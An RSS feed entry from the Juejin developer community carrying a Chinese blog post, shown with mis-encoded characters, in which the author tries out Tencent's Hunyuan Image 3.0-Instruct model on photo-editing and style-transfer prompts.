<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[è…¾è®¯é‡ç£…å¼€æºï¼æ··å…ƒå›¾åƒ 3.0 å›¾ç”Ÿå›¾çœŸé¦™ï¼]]></title>    <link>https://juejin.cn/post/7604471065860259891</link>    <guid>https://juejin.cn/post/7604471065860259891</guid>    <pubDate>2026-02-09T09:05:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604471065860259891" data-draft-id="7604690250343743538" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è…¾è®¯é‡ç£…å¼€æºï¼æ··å…ƒå›¾åƒ 3.0 å›¾ç”Ÿå›¾çœŸé¦™ï¼"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-09T09:05:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‹ä½•"/> <meta itemprop="url" content="https://juejin.cn/user/588993963763405"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è…¾è®¯é‡ç£…å¼€æºï¼æ··å…ƒå›¾åƒ 3.0 å›¾ç”Ÿå›¾çœŸé¦™ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993963763405/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‹ä½•
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:05:53.000Z" title="Mon Feb 09 2026 09:05:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™æ˜¯è‹ä½•çš„ç¬¬ 484 ç¯‡åŸåˆ›ï¼</p>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯è‹ä½•ã€‚</p>
<p>è¦è¯´è¿‘ä¸¤å¤©æœ€ç«çš„æ˜¯ä»€ä¹ˆï¼Œé‚£å°±æ˜¯å…ƒå®æ´¾äº†ï¼Œæˆ‘çš„å‡ åä¸ªç¾¤ï¼Œä»æ—©åˆ°æ™šåœ¨å‘çº¢åŒ…é“¾æ¥ï¼Œå¯¼è‡´æˆ‘çš„æœªè¯»æ¶ˆæ¯ç›´æ¥é£™åˆ°äº†ä¸Šä¸‡æ¡ï¼Œå¥½å®¶ä¼™ã€‚</p>
<p>æ˜¨å¤©ä¹Ÿåˆ†äº«äº†å‡ ç™¾ä¸ªé‚€è¯·ç ï¼Œå»ºäº†ä¸å°‘å…ƒå®æ´¾ï¼Œæˆ‘å‘ç°å¤§å®¶åœ¨æ´¾é‡Œï¼Œç»å¸¸ä¼šç”¨å…ƒå®æ¥ç”Ÿå›¾ï¼ŒåŠ¨ä¸åŠ¨å°±æ˜¯å¥½å‡ ä¸ªäººåŒæ—¶@å…ƒå®ï¼Œå‘ç°å…ƒå®ç”Ÿå›¾è¿˜æŒºå¿«çš„ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/950c158b87f54ccfbabbbc711e609245~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=tQGo%2BvH3%2F%2BSqtNu0FT2Erg6enw4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è€Œä¸”æ•ˆæœä¹Ÿæ¯”ä¹‹å‰å¥½äº†ä¸å°‘ï¼Œæˆ‘ä¼°æ‘¸ç€æ˜¯å‡çº§äº†æ··å…ƒæ¨¡å‹çš„ç”Ÿå›¾èƒ½åŠ›äº†ï¼Œä¸ç„¶æ‰›ä¸ä½å…ƒå®æ´¾å‹ä»¬çš„çƒ­æƒ…ï¼Œå™¼é‡Œå•ªå•¦ä¸¤ä¸‹å¡ä½ï¼Œä½“éªŒå°±ä¸å¥½äº†ã€‚</p>
<p>ç¨å¾®æŸ¥äº†ä¸‹ï¼Œæœç„¶ä¸å‡ºæ‰€æ–™ï¼Œ<strong>ã€Œè…¾è®¯æ‚„æ‚„å‘å¸ƒå¹¶å¼€æºäº†æ··å…ƒå›¾åƒ 3.0-Instruct æ¨¡å‹ã€</strong>ï¼Œç°åœ¨å…ƒå®ä¸Šç”Ÿå›¾ï¼Œç”¨çš„å°±æ˜¯è¿™ä¸ªæœ€æ–°çš„æ··å…ƒæ¨¡å‹ã€‚</p>
<p>æˆ‘çœ‹äº†å®˜æ–¹è¯´æ˜ï¼Œæ··å…ƒå›¾åƒ 3.0-Instruct æ¨¡å‹æœ‰ä»¥ä¸‹çš„èƒ½åŠ›æå‡ï¼š</p>
<blockquote>
<p>æ”¯æŒå›¾ç‰‡ç¼–è¾‘å’Œå¤šå›¾èåˆèƒ½åŠ›ï¼ŒæŒ‡ä»¤éµå¾ªæ•ˆæœç¨³å®šï¼Œç”Ÿæˆçš„å›¾ç‰‡ä¸€è‡´æ€§é«˜ã€çœŸå®æ„Ÿå¼ºã€æƒ…ç»ªè¡¨ç°åŠ›ä½³ï¼Œç”Ÿæˆé€Ÿåº¦è·å¾—æ˜æ˜¾æå‡.</p>
</blockquote>
<p>ä¸ºäº†éªŒè¯ä¸‹çœŸå‡ï¼Œæˆ‘ä¹Ÿå¯¹è¯¥æ¨¡å‹è¿›è¡Œäº†ä¸€è½®æ‹·æ‰“æµ‹è¯•ï¼Œä¸‹é¢å¼€æ•´ã€‚</p>
<p>é™¤äº†å…ƒå®é‡Œé¢ï¼Œæˆ‘å‘ç°ï¼Œåœ¨è…¾è®¯æ··å…ƒå®˜ç½‘ä¹Ÿå·²ç»ä¸Šçº¿äº†è¿™ä¸ªæ–°æ¨¡å‹ï¼Œæˆ‘å°±å…ˆåœ¨å®˜ç½‘å¼€å§‹å§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b6a7a56045b496fb55e2c7f00f4be74~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=rYaBcvF%2FYC3Viv1M8le%2FMulVaLY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ—¢ç„¶æ˜¯å›¾ç”Ÿå›¾æ¨¡å‹ï¼Œç†Ÿé—¨ç†Ÿè·¯ï¼Œé‚£å°±ç›´æ¥å¼€æµ‹å§ã€‚</p>
<blockquote>
<p>æç¤ºè¯ï¼šå°†è¿™å¼ å¼ â€œç™½å¤©æ‹æ‘„çš„æ¯æ ‘â€è½¬å˜ä¸ºâ€œå¤œæ™šå‘å…‰çš„é˜¿å‡¡è¾¾é£æ ¼ç”Ÿå‘½ä¹‹æ ‘â€</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/717a25a008464db4aab74ab60c7823c7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=D6yllaeyoB%2BjnTUwJok%2FeyAEvCg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¾ˆå¿«å°±ç”Ÿæˆäº†ä¸€å¼ æ•ˆæœä¸é”™çš„ã€Œç”Ÿå‘½ä¹‹æ ‘ã€ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/450e25279c6d4269bfb2c7fdbb663b91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=l%2Bymf54CiyVHNDLsY6zP3kHWCa8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å…‰å½±çš„çƒ˜æ‰˜å’Œè¡¨ç°åŠ›ä¸Šè¿˜æ˜¯éå¸¸åˆ°ä½çš„ã€‚</p>
<p>æ¥ä¸‹æ¥ç»§ç»­ç»™æç¤ºè¯ï¼šå°†å¥”è·‘çš„äººè½¬å˜ä¸ºç”±æµæ°´ç»„æˆçš„åŠé€æ˜äººå½±</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5392c427fbf4401293d9fecbe0d93a57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=9U7fLvsrJHIDiMHelomsoRgc%2BTg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æç¤ºè¯ï¼šè½¬æ¢ä¸ºå‰æ™®åŠ›é£æ ¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1198c2aebe04c75959b4d90799fa198~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=zVXkZG452%2F1OwsjqXauH3qgqhII%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>åŸºæœ¬ä¸Šç”Ÿæˆæœ€å¿«åå‡ ç§’å°±ç”Ÿæˆäº†ï¼Œç”Ÿæˆé€Ÿåº¦ä¸Šå’Œè¡¨ç°åŠ›ç¡®å®æå‡å¾ˆå¤§ã€‚</p>
<p>ä¸åƒğŸŒproï¼Œç”Ÿæˆæœ€å°‘ä¹Ÿå¾—ç­‰ä¸ªå‡ åç§’ï¼Œç­‰å¾…çš„è¿‡ç¨‹éå¸¸ç—›è‹¦ã€‚</p>
<p>å†æ¥äº†ä¸€ä¸ªå°é©¬è¿ç¯ç”»ï¼ŒåŒæ ·ä¹Ÿæ˜¯å¾ˆå¿«å°±ç”Ÿæˆå‡ºæ¥ï¼Œä¸€è‡´æ€§ä¿æŒçš„ä¸é”™ã€‚</p>
<p>æç¤ºè¯ï¼šä»¥è¿™ä¸ªå°é©¬ä¸ºä¸»è§’ï¼Œåˆ›ä½œä¸€ä¸ªå…·æœ‰9å¼ å›¾ç‰‡çš„ç»˜æœ¬æ•…äº‹ï¼Œé€‚åˆä¸‰å²å°æœ‹å‹é˜…è¯»ï¼Œéœ€è¦æœ‰ç®€å•çš„æ–‡å­—ï¼Œæ–¹ä¾¿å®¶é•¿ç»™å°æœ‹å‹è®²æ•…äº‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53a81ba58e8b4f579cf33581c1eb1130~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=OPculSxfqLF7bN0qJdcLNiijqgs%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02f91cd62a374dffadda2c9bbd4ea7ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=Dt1%2Br548W8BXIRVkAf1TwQUvvlw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å‰å‡ å¤©å»æ¨ªé“æ²³å­è¢«ç¾å“­äº†ï¼Œæ‹äº†ä¸€äº›ç…§ç‰‡ï¼Œé‡Œé¢æœ‰è·¯äººï¼Œè®©å®ƒå¸®æˆ‘Pæ‰å¹¶ç¾åŒ–ä¸€ä¸‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79178187f2c147718e56a1978d59b371~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=hKaejkOhu68rwtqQQtviIBgTlMw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æç¤ºè¯ï¼šå¸®æˆ‘æŠŠè¿™å¼ å›¾ç‰‡ä¸­çš„äººPæ‰ï¼Œå¹¶è®©æ•´ä¸ªå›¾ç‰‡çœ‹èµ·æ¥åƒæœ‰é˜³å…‰ç…§å°„çš„æ„Ÿè§‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40bfe1af685f48b785e2f507b5ecf11a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=MWP4RGrvKPMlvKnVtX323qEx4V4%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å»ç –çŸ³æµ·çš„æ—¶å€™æƒ³æ‹ä¸€ä¸ªè½æ—¥æ—¶åˆ†çš„å›¾ç‰‡ï¼Œèµ¶æ—¶é—´æ²¡æ‹åˆ°ï¼Œäºæ˜¯è®©å®ƒPä¸€ä¸‹ï¼š</p>
<p><em>æç¤ºè¯ï¼šè¿™å¼ äººèººåœ¨å†°å—å †ä¸­çš„ç…§ç‰‡ï¼Œå¸®æˆ‘æŠŠè¿™å¼ å›¾è½¬åŒ–ä¸ºè¿œæ™¯ä¿¯æ‹ï¼Œåœ¨äººç‰©å‘¨å›´æ•£è½ç€æˆç‰‡çš„å†°å—ï¼Œè¥é€ äººèººåœ¨å†°å—ç¾¤çš„æ„Ÿè§‰ï¼Œé»„æ˜ä¸­è“è°ƒçš„ç –çŸ³æµ·çš„æ„Ÿè§‰</em></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0cab926802084a7cac5499bd49fa12d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=%2Bz3wVe%2BmHCK232%2FMhXEq8RanxeI%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç¬é—´å°±æœ‰é‚£ç§æ„Ÿè§‰äº†å¥½å§ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6588fd0a2cd420c8bab0c948fbefd7e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=aq5IPjinz8ZVLUrV5BR0XnS%2FPFk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥åˆæµ‹è¯•äº†ä¸€ä¸‹é£æ ¼å˜æ¢èƒ½åŠ›</p>
<p>ç»™å®ƒä¸€ä¸ªç¾å¥³ï¼Œè®©å®ƒå¸®å¿™å˜æ¢é£æ ¼</p>
<p>æç¤ºè¯ï¼šè¯·ç»™è¿™ä¸ªå¥³ç”Ÿç”»ä¸Šå››ç§ä¸åŒçš„å¦†å®¹ï¼Œå¹¶åŒ¹é…ç›¸åº”çš„ç©¿æ­é£æ ¼å’Œç¯å¢ƒ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68174bbf3ac4192b8169598f32e9477~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=olLjYt0f6GZwneoCYWh1Pb8O1PY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>äººç‰©ä¸€è‡´æ€§ä¿æŒçš„ä¸é”™ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce5cbf550aa646f3a6d07c98ddea36f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=pmIBFm2d5qEdSqCLDOtLGZXtLp0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†è®©å®ƒé’ˆå¯¹ä¸€äº›æœè£…å•å“ï¼Œç»™å‡ºä¸‰å¥—ç©¿æ­ï¼Œç»™è€å©†çœ‹äº†ï¼Œç›´å‘¼ç‰›æ°ï¼Œå†ä¹Ÿä¸ç”¨å‘æ„æ€ä¹ˆæ­é…å•å“äº†ã€‚</p>
<p>æç¤ºè¯ï¼šè¿™ä»¶ç™½è‰²çš„æ¯›è¡£ï¼Œæ¯›è¡£æ‹‰é“¾æ‹‰ä¸‹æ¥ä¸€äº›å¯å˜æˆç¿»é¢†æ¯›è¡£ï¼Œè¯·å¸®æˆ‘æƒ³ä¸‰ä¸ªç©¿æ­æ–¹æ¡ˆï¼Œå¥³ç”Ÿ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76974f4477554c36a0e88e261869546a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=zK1PAA9RePEEd%2FVGzYBZsBTT7tI%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc17cd23fb25435d9ec3badade1eccd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=CrLAdCrBn9vyn8qUwmD6SA34HP8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†æ¥ä¸ªèŒèŒå“’çš„å°ä¼é¹…å§</p>
<p>æç¤ºè¯ï¼šä»¥è¿™ä¸ªèŒèŒçš„ä¼é¹…ä¸ºåŸå‹ï¼Œè®¾è®¡ä¸‰ä¸ªQç‰ˆçš„ä¼é¹…å›¾åƒï¼Œåˆ†åˆ«ä¸ºæ¯›çº¿é£æ ¼ã€åƒç´ é£æ ¼ã€å‰æ™®åŠ›é£æ ¼</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6521fe1f94894971805e581000f206cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=%2Fu1tuFv39pp0KgsBUJUhfgsd5Gk%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/468c171686d54e2fbe1fb07c3374eb39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=Rg%2Fp0mqoEtxO4NtzmkWMOGOeWwQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘å–œæ¬¢é¸£äººï¼Œæƒ³è¯•è¯•å›¾ç‰‡å˜æ‰‹åŠçš„æ„Ÿè§‰</p>
<p>æç¤ºè¯ï¼šæŠŠé¸£äººçš„è¿™å¼ å›¾åšæˆ3Dæ‰‹åŠ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/abd9b7f3c48040959678b8cb2496c4c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=jZnpB%2FmvXffw1m2cGnZePiN%2BgZc%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a9b28e56c0d41e1bd29b469e2991ea2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=CzA2RQS051Kpaa3C4nOlwFxThX8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å†æ¥è¯•è¯•äººç‰©ç”»åƒå˜çœŸäºº</p>
<p>æç¤ºè¯ï¼šè¯·æŠŠXXXçš„ç”»åƒå˜æˆç«‹ä½“çš„çœŸäºº</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c255dc4d0424cc9a2cc907812d37b2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=FxqIrLLDaFENdBGnAIPIUtinX%2Bk%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21099a0cfd3344dc8b02a716de8d8845~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=4Vr%2B%2F8ntV4MmAVpvyaj99IoKS9I%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aec17f1e16f74c2d8ac24781b08f8199~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=fEVQ2zWQ%2B6lKOC5OLkoF6EClZTk%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66dccdf9d1c64be8878d0d43268b618c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuN5L2V:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771232752&amp;x-signature=pCdxU0IIIyjdIwRykPKw4NmuUuA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è®©ä»–ä»¬æ¥ä¸ªåˆç…§å§</p>
<p>æç¤ºè¯ï¼šè®©å›¾1å’Œå›¾2çš„äººç‰©è‡ªæ‹ï¼Œé£æ ¼æ¢æˆçœŸäººå†™å®é£æ ¼ï¼ŒèƒŒæ™¯æ¢æˆåœ¨æ•…å®«å¤§æ®¿é‡Œé¢æ‹æ‘„ï¼Œæœ‰è‡ªæ‹çš„æ¨¡ç³Šæ„Ÿ</p>
